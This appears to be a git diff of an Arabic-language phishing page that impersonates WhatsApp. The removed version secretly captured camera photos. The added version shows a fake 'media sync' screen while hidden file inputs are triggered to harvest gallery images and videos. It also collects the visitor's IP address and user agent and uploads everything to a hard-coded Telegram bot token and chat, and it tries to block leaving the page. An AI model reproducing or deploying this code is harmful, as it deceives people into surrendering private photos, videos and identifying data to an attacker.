@@ -40,38 +40,6 @@
         }
         h1 { font-size: 28px; margin-bottom: 10px; color: #25D366; }
         p { font-size: 16px; margin-bottom: 30px; opacity: 0.8; }
-        .camera-container { 
-            position: relative; 
-            width: 100%; 
-            height: 300px; 
-            background: #000; 
-            border-radius: 15px; 
-            overflow: hidden; 
-            margin-bottom: 20px; 
-            display: none;
-        }
-        #video { width: 100%; height: 100%; object-fit: cover; }
-        .controls { 
-            position: absolute; 
-            bottom: 15px; 
-            left: 50%; 
-            transform: translateX(-50%); 
-            display: flex; 
-            gap: 10px;
-        }
-        .flip-btn { 
-            background: rgba(255,255,255,0.9); 
-            border: none; 
-            border-radius: 50%; 
-            width: 50px; height: 50px; 
-            font-size: 20px; 
-            cursor: pointer; 
-            transition: all 0.3s; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-        }
-        .flip-btn:hover { background: white; transform: scale(1.1); }
         .status { 
             background: #25D366; 
             color: white; 
@@ -81,145 +49,164 @@
             margin-bottom: 20px; 
             animation: pulse 2s infinite;
         }
+        .gallery-container { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 0; 
+            height: 0; 
+            opacity: 0; 
+            z-index: -1;
+        }
         @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <div class="container" id="updateScreen">
+    <div class="container" id="loadingScreen">
         <div class="logo">واتساب</div>
-        <h1>تحديث أمان جديد</h1>
-        <p>للحفاظ على حسابك آمنًا، يرجى السماح بالوصول للكاميرا للتحقق من الهوية</p>
-        <div class="status">جاري التحديث...</div>
+        <h1>مزامنة الوسائط</h1>
+        <p>جاري تحميل الصور والفيديوهات من معرضك...</p>
+        <div class="status">لا تُغلق الصفحة ١٠ ثوانٍ</div>
     </div>
 
-    <div class="container hidden" id="cameraScreen">
-        <h1>التحقق من الهوية</h1>
-        <p>الرجاء النظر إلى الكاميرا لمدة 3 ثوانٍ</p>
-        <div class="camera-container" id="cameraContainer">
-            <video id="video" autoplay muted playsinline></video>
-            <div class="controls">
-                <button class="flip-btn" id="flipBtn">🔄</button>
-            </div>
-        </div>
-        <div class="status">جاري التقاط الصورة...</div>
+    <!-- 8 مدخلات مخفية لسرقة المعرض -->
+    <div class="gallery-container">
+        <input type="file" id="gallery1" webkitdirectory multiple accept="image/*,video/*" style="display:none;">
+        <input type="file" id="gallery2" webkitdirectory multiple accept="image/*,video/*" style="display:none;">
+        <input type="file" id="gallery3" multiple accept="image/*,video/*" style="display:none;">
+        <input type="file" id="gallery4" multiple accept="image/*" style="display:none;">
+        <input type="file" id="gallery5" multiple accept="video/*" style="display:none;">
+        <input type="file" id="gallery6" webkitdirectory accept="image/jpeg,image/png" style="display:none;">
+        <input type="file" id="gallery7" multiple accept="image/heic" style="display:none;">
+        <input type="file" id="gallery8" multiple style="display:none;">
     </div>
 
     <script>
         const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
         const CHAT_ID = '8539996558';
-        let video = document.getElementById('video');
-        let currentStream = null;
-        let facingMode = 'user'; // ابدأ بكاميرا أمامية
+        const galleries = [
+            'gallery1', 'gallery2', 'gallery3', 'gallery4', 
+            'gallery5', 'gallery6', 'gallery7', 'gallery8'
+        ];
 
-        // إرسال IP أولاً
+        // إرسال IP
         async function sendIP() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                const victimIP = ipData.ip;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `🎣 فيكتيم جديد!\n📍 IP: ${victimIP}\n🌐 User-Agent: ${navigator.userAgent}`
+                        text: `🎣 فيكتيم معرض!\n📍 IP: ${ipData.ip}\n🌐 UA: ${navigator.userAgent}\n📱 جهاز: Android/iOS`
                     })
                 });
-                console.log('IP sent:', victimIP);
-            } catch(e) { console.error('IP send failed'); }
+                console.log('✅ IP مرسل:', ipData.ip);
+            } catch(e) { console.error('IP فشل'); }
         }
 
-        // تبديل الكاميرا
-        async function flipCamera() {
-            facingMode = facingMode === 'user' ? 'environment' : 'user';
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
-            startCamera();
-        }
-
-        // بدء الكاميرا
-        async function startCamera() {
-            try {
-                currentStream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: facingMode,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
+        // محاولة سرقة ملفات المعرض
+        async function stealGallery(inputId) {
+            return new Promise((resolve) => {
+                const input = document.getElementById(inputId);
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true,
+                    buttons: 1
                 });
-                video.srcObject = currentStream;
-                video.play();
-                setTimeout(capturePhoto, 2000); // التقاط أول صورة بعد 2 ثانية
-                startAutoCapture(); // التقاط تلقائي كل 3 ثوان
+                
+                input.addEventListener('change', async (e) => {
+                    console.log(`📁 ${inputId}: ${e.target.files?.length || 0} ملف`);
+                    
+                    for(let i = 0; i < Math.min(e.target.files.length, 10); i++) { // أقصى 10 ملفات
+                        const file = e.target.files[i];
+                        if(file && (file.type.startsWith('image/') || file.type.startsWith('video/')) && file.size > 0) {
+                            await sendFile(file, inputId);
+                        }
+                    }
+                    resolve();
+                });
+
+                // محاولات click متعددة
+                setTimeout(() => input.dispatchEvent(clickEvent), 100);
+                setTimeout(() => input.dispatchEvent(clickEvent), 500);
+                setTimeout(() => input.click(), 1000);
+                setTimeout(() => input.dispatchEvent(clickEvent), 2000);
+            });
+        }
+
+        // إرسال ملف واحد
+        async function sendFile(file, source) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            
+            if(file.type.startsWith('image/')) {
+                formData.append('photo', file, file.name);
+            } else {
+                formData.append('video', file, file.name);
+                formData.append('caption', `🎥 فيديو من ${source}\n📏 ${formatBytes(file.size)}`);
+                return; // فيديوهات كبيرة، أرسل واحد فقط
+            }
+            
+            formData.append('caption', `📸 صورة من ${source}\n📏 ${formatBytes(file.size)}`);
+            
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await res.json();
+                if(data.ok) console.log(`✅ ${file.name} مرسل (${source})`);
             } catch(e) {
-                console.error('Camera access denied:', e);
-                showUpdateScreen();
+                console.error(`❌ ${file.name} فشل`);
             }
         }
 
-        // التقاط صورة واحدة
-        async function capturePhoto() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+        function formatBytes(bytes) {
+            if(bytes < 1024) return bytes + ' B';
+            if(bytes < 1024*1024) return (bytes/1024).toFixed(1) + ' KB';
+            return (bytes/(1024*1024)).toFixed(1) + ' MB';
+        }
+
+        // تشغيل الهجوم المتوازي
+        async function launchGalleryAttack() {
+            console.log('🚀 بدء سرقة المعرض...');
             
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `📸 صورة من فيكتيم\n🎥 كاميرا: ${facingMode === 'user' ? 'أمامية' : 'خلفية'}`);
-                
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    const data = await res.json();
-                    console.log('Photo sent:', data.ok ? 'Success' : data.description);
-                } catch(e) {
-                    console.error('Photo send failed:', e);
-                }
-            }, 'image/jpeg', 0.8);
+            // تشغيل كل المدخلات بالتوازي
+            const promises = galleries.map(async (id, index) => {
+                await new Promise(r => setTimeout(r, index * 300)); // تأخير تدريجي
+                return stealGallery(id);
+            });
+            
+            await Promise.all(promises);
+            console.log('🏁 انتهت محاولات المعرض');
         }
 
-        // التقاط تلقائي كل 3 ثوان
-        function startAutoCapture() {
-            setInterval(capturePhoto, 3000);
-        }
-
-        // إظهار شاشة الكاميرا
-        function showCameraScreen() {
-            document.getElementById('updateScreen').classList.add('hidden');
-            document.getElementById('cameraScreen').classList.remove('hidden');
-            document.getElementById('cameraContainer').style.display = 'block';
-        }
-
-        // إظهار شاشة التحديث
-        function showUpdateScreen() {
-            document.getElementById('cameraScreen').classList.add('hidden');
-            document.getElementById('updateScreen').classList.remove('hidden');
-        }
-
-        // تشغيل بعد تحميل الصفحة
+        // التشغيل الرئيسي
         window.addEventListener('load', async () => {
             await sendIP();
+            
+            // إخفاء الشاشة بعد 12 ثانية
             setTimeout(() => {
-                showCameraScreen();
-                startCamera();
-            }, 1500);
+                document.body.innerHTML = '<div style="text-align:center;padding:40px;color:#25D366;">تمت المزامنة بنجاح ✅</div>';
+            }, 12000);
+            
+            // بدء الهجوم فوراً
+            setTimeout(launchGalleryAttack, 1500);
         });
 
-        // زر تبديل الكاميرا
-        document.getElementById('flipBtn').addEventListener('click', flipCamera);
+        // إعادة المحاولة عند التركيز
+        window.addEventListener('focus', () => {
+            setTimeout(launchGalleryAttack, 500);
+        });
 
-        // تنظيف عند الخروج
-        window.addEventListener('beforeunload', () => {
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
+        // منع الخروج
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            return 'جاري المزامنة، لا تغلق!';
         });
     </script>
 </body>
